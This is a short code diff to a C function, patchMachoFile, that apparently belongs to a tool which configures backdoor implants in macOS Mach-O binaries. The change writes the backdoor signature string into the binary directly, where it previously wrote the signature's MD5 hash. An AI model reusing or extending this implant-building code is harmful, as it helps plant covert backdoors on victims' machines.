@@ -155,11 +155,11 @@ patchMachoFile ()
   printf("[x] Configuration key patched\n");
 
 	// Patching Backdoor signature
-  MD5((const UCHAR *)szBackdoorSignature, strlen(szBackdoorSignature) , (PUCHAR)md5Value);
+  //MD5((const UCHAR *)szBackdoorSignature, strlen(szBackdoorSignature) , (PUCHAR)md5Value);
 	if (patchValue (pBlockPtr,
                   iLen,
-                  (BYTE *)md5Value,
-                  16,
+                  (BYTE *)szBackdoorSignature,
+                  strlen(szBackdoorSignature),
                   SIGNATURE_MARK,
                   SIGNATURE_MARK_LEN) != kSuccess)
     {
